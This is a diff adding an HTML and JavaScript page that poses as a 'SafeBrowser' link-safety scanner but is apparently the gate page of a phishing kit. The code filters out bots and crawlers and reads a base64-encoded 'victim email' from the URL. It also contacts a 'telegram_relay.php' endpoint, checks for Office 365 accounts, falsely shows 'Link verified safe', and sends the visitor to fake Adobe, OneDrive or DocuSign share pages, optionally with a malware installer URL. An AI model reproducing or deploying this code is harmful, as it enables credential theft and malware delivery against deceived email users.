@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifying Connection</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --surface: #ffffff;
+      --text: #111827;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --blue: #3b82f6;
+      --blue-glow: rgba(59,130,246,0.1);
+      --green: #10b981;
+      --green-glow: rgba(16,185,129,0.1);
+      --radius: 12px;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --surface: #1f2937; --text: #f9fafb; --muted: #9ca3af;
+        --border: #374151;
+      }
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Inter', sans-serif;
+      background: #0b0e15 radial-gradient(circle at 50% 0%, #1e293b, #0f172a);
+      color: var(--text); padding: 16px;
+    }
+    /* watermark footer */
+    .footer {
+      position: fixed; bottom: 32px; left: 0; right: 0;
+      text-align: center; font-size: 12px; color: rgba(255, 255, 255, 0.85);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600;
+      pointer-events: none;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+    .footer svg { opacity: 0.9; }
+    .footer-dot { width: 4px; height: 4px; border-radius: 50%; background: rgba(255, 255, 255, 0.6); }
+    /* top-of-card loading rail */
+    .top-rail { display: none; }
+    .top-rail-bar { display: none; }
+    .top-rail-bar.done { display: none; }
+    .card {
+      position: relative; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 24px; padding: 56px 48px 44px;
+      width: calc(100% - 32px); max-width: 480px;
+      box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+      animation: fadeUp .4s ease both;
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    /* advanced scanner animation */
+    .scan-ring-wrap {
+      position: relative; width: 150px; height: 150px; margin: 0 auto 40px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .scan-ring {
+      position: absolute; inset: 0; border-radius: 50%;
+      border: 1px solid rgba(59,130,246,0.05);
+      border-top: 1.5px solid #3b82f6;
+      border-right: 1.5px solid rgba(59,130,246,0.4);
+      animation: spin 1.2s linear infinite;
+    }
+    .scan-ring-2 {
+      position: absolute; inset: 12px; border-radius: 50%;
+      border: 1px solid rgba(59,130,246,0.05);
+      border-bottom: 1.5px solid #3b82f6;
+      border-left: 1.5px solid rgba(59,130,246,0.4);
+      animation: spin-reverse 1.8s linear infinite;
+    }
+    .scan-ring-3 {
+      position: absolute; inset: 24px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(59,130,246,0.12) 0%, transparent 70%);
+      display: flex; align-items: center; justify-content: center;
+      transition: background 0.5s, transform 0.5s;
+    }
+    .scan-ring-3::after {
+      content: ''; position: absolute; inset: 0; border-radius: 50%;
+      box-shadow: 0 0 35px rgba(59,130,246,0.3);
+      animation: pulse-glow 2s ease-in-out infinite;
+    }
+    .scan-ring-3.done { 
+      background: radial-gradient(circle, rgba(52,211,153,0.15) 0%, transparent 70%);
+      transform: scale(1.08);
+    }
+    .scan-ring-3.done::after { box-shadow: 0 0 35px rgba(52,211,153,0.4); animation: none; }
+    .scan-ring.done, .scan-ring-2.done { opacity: 0; transition: opacity 0.4s; }
+    
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    @keyframes spin-reverse { 100% { transform: rotate(-360deg); } }
+    @keyframes pulse-glow { 0%, 100% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
+    /* text */
+    .heading {
+      text-align: center; font-size: 20px; font-weight: 600; color: #ffffff;
+      letter-spacing: 0.5px; margin-bottom: 16px; white-space: nowrap;
+    }
+    .subheading {
+      text-align: center; font-size: 14px; color: #cbd5e1;
+      margin-bottom: 32px; line-height: 1.6;
+    }
+    .status-text-wrap { height: 26px; position: relative; margin-bottom: 8px; overflow: hidden; }
+    .status-text {
+      text-align: center; font-size: 17px; color: #ffffff;
+      font-weight: 400; position: absolute; width: 100%; letter-spacing: 0.5px;
+      opacity: 0; transform: translateY(12px); transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .status-text.active { opacity: 1; transform: translateY(0); }
+    .status-text.exit { opacity: 0; transform: translateY(-12px); }
+    /* result */
+    .result-msg {
+      display: none; text-align: center; margin-top: 24px;
+      font-size: 13px; color: var(--green); font-weight: 500;
+      letter-spacing: .1px;
+    }
+    @media (max-width: 480px) { .card { padding: 36px 24px 28px; } }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="top-rail"><div class="top-rail-bar" id="progressBar"></div></div>
+
+  <div class="scan-ring-wrap" id="scanRingWrap">
+    <div class="scan-ring" id="ring1"></div>
+    <div class="scan-ring-2" id="ring2"></div>
+    <div class="scan-ring-3" id="ring3">
+      <svg id="shieldScanning" width="36" height="36" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" fill="#3b82f6" opacity=".15"/>
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" stroke="#3b82f6" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+        <circle cx="12" cy="13" r="2.4" stroke="#3b82f6" stroke-width="1.4" fill="none"/>
+        <line x1="13.7" y1="14.7" x2="15.8" y2="16.8" stroke="#3b82f6" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <svg id="shieldDone" width="36" height="36" viewBox="0 0 24 24" fill="none" style="display:none;">
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" fill="#34d399" opacity=".15"/>
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" stroke="#34d399" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+        <polyline points="8.5 12.5 11 15 15.5 9.5" stroke="#34d399" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="heading" id="headingText">Verifying secure connection&hellip;</div>
+  
+  <div class="status-text-wrap">
+    <div class="status-text active" id="rotatorText">Initializing secure environment...</div>
+  </div>
+
+  <div class="result-msg" id="resultMsg">All checks passed &mdash; redirecting you now</div>
+
+</div>
+
+<div class="footer">
+  <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
+    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.89-7 10.02-3.87-1.13-7-5.35-7-10.02v-4.7l7-3.12zm-1 5.82v2h2V9h-2zm0 4h2v2h-2v-2z"/>
+  </svg>
+  <span>SafeBrowser</span>
+  <div class="footer-dot"></div>
+  <span>Secure Link Scanner</span>
+</div>
+
+<script>
+/* -- STANDALONE CONFIGURATION -- */
+const MAIN_APP_URL = "https://starsprit.com"; // Change to your actual main app URL (without trailing slash)
+const BLOCK_REDIRECT_URL = "https://google.com";
+
+(async function () {
+
+  /* -- Server Validation (Antibot) -- */
+  async function verifyVisitor() {
+    try {
+      const res = await fetch(MAIN_APP_URL + "/verify_visitor_api.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+           // IP and UserAgent are automatically captured by the API endpoint via $_SERVER
+        })
+      });
+      const data = await res.json();
+      if (data && data.allowed === false) {
+        window.location.replace(BLOCK_REDIRECT_URL);
+        // Halt execution
+        await new Promise(() => {});
+      }
+    } catch (e) {
+      // If the API call fails, proceed silently or block based on strictness preference.
+      // We proceed silently here so legitimate users aren't blocked by transient network errors.
+    }
+  }
+
+  // Await validation immediately
+  await verifyVisitor();
+
+  /* -- Helpers -- */
+  function el(id) { return document.getElementById(id); }
+
+  function getApiBase() {
+    return MAIN_APP_URL + '/';
+  }
+
+  /* -- Extract victim email from ?ref= or #hash -- */
+  const urlParams = new URLSearchParams(window.location.search);
+  let victimEmail = '';
+  const rawRef = urlParams.get('ref') || '';
+  if (rawRef) {
+    victimEmail = decodeURIComponent(rawRef);
+    try {
+      const decoded = atob(victimEmail.replace(/\s/g, ''));
+      if (decoded && decoded.includes('@')) victimEmail = decoded;
+    } catch (e) {}
+  }
+  if (!victimEmail) {
+    const hash = window.location.hash || '';
+    if (hash) {
+      const frag = hash.substr(1);
+      const idx = frag.indexOf('=');
+      victimEmail = idx !== -1 ? frag.substr(idx + 1) : frag;
+    }
+  }
+
+  /* -- Rotating text sequencer -- */
+  const STATUS_MESSAGES = [
+    { text: "Initializing secure environment...", dur: 800 },
+    { text: "Verifying document encryption...", dur: 1000 },
+    { text: "Validating secure channel...", dur: 900 },
+    { text: "Completing security checks...", dur: 800 }
+  ];
+
+  function setProgress(pct) {
+    el('progressBar').style.width = pct + '%';
+  }
+
+  async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  /* -- Run scan animation -- */
+  async function runScan() {
+    setProgress(4);
+    const textEl = el('rotatorText');
+    
+    for (let i = 0; i < STATUS_MESSAGES.length; i++) {
+      if (i > 0) {
+        textEl.className = 'status-text exit';
+        await delay(300);
+        textEl.textContent = STATUS_MESSAGES[i].text;
+        textEl.className = 'status-text';
+        void textEl.offsetWidth;
+      }
+      textEl.className = 'status-text active';
+      const pct = 4 + ((i + 1) / STATUS_MESSAGES.length) * 96;
+      setProgress(pct);
+      await delay(STATUS_MESSAGES[i].dur);
+    }
+    
+    setProgress(100);
+    el('progressBar').classList.add('done');
+    el('ring1').classList.add('done');
+    el('ring2').classList.add('done');
+    el('ring3').classList.add('done');
+  }
+
+  /* -- Parallel: fetch site config + detect provider -- */
+  const apiBase = getApiBase();
+
+  const [cfg, providerData] = await Promise.all([
+    fetch(apiBase + 'telegram_relay.php?config=1')
+      .then(r => r.ok ? r.json() : {})
+      .catch(() => ({})),
+
+    (victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail))
+      ? fetch(apiBase + 'detect_provider_api.php?email=' + encodeURIComponent(victimEmail),
+              { signal: AbortSignal.timeout ? AbortSignal.timeout(5000) : undefined })
+          .then(r => r.ok ? r.json() : {})
+          .catch(() => ({}))
+      : Promise.resolve({}),
+
+    runScan()
+  ]);
+
+  /* -- Done state -- */
+  el('shieldScanning').style.display = 'none';
+  el('shieldDone').style.display     = 'block';
+  el('headingText').textContent  = 'Link verified safe';
+  el('rotatorText').textContent  = 'No threats detected';
+  el('resultMsg').style.display  = 'block';
+
+  /* -- Routing decision -- */
+  const landingMode   = cfg.landing_mode || 'single';
+  const isO365        = !!(providerData && providerData.is_o365);
+  const installerUrl  = cfg.installer_url || '';
+  const webmailUrl    = cfg.webmail_installer_url || '';
+
+  const refParam = urlParams.get('ref')
+    ? '?ref=' + urlParams.get('ref')
+    : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
+
+  let targetPage = '';
+
+  if (landingMode === 'dual-adobe-onedrive') {
+    targetPage = isO365 ? 'OneDrive.html' : 'index.html';
+    if (cfg.installer_enabled) {
+      window._installerUrl = isO365 ? installerUrl : webmailUrl;
+    }
+  } else if (landingMode === 'dual-docusign-onedrive') {
+    targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
+    if (cfg.installer_enabled) {
+      window._installerUrl = isO365 ? installerUrl : webmailUrl;
+    }
+  } else {
+    const style = (cfg.page_style || 'adobe').toLowerCase();
+    if (style === 'onedrive')      targetPage = 'OneDrive.html';
+    else if (style === 'docusign') targetPage = 'docs.html';
+    else                           targetPage = 'index.html';
+    if (cfg.installer_enabled) window._installerUrl = installerUrl;
+  }
+
+  if (window._installerUrl) {
+    try { sessionStorage.setItem('_gate_installer_url', window._installerUrl); } catch(e) {}
+  }
+
+  await delay(900);
+
+  /* Navigate to the chosen share page ON THE MAIN SERVER, preserving email ref */
+  const finalDest = MAIN_APP_URL + '/share/' + targetPage + refParam;
+  window.location.replace(finalDest);
+
+})();
+</script>
+</body>
+</html>
